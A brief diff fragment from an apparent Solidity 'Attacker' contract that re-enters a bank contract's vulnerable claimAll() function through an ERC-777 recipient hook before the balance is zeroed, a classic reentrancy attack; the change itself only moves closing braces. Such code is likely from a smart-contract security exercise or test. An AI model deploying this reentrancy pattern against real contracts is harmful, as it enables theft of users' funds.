@@ -67,7 +67,6 @@ contract Attacker is AccessControl, IERC777Recipient {
         emit Recurse(depth);
         // Re-enter the vulnerable claimAll() before the bank zeroes out our balance
         bank.claimAll();
+		}
 	}
-
-}
 
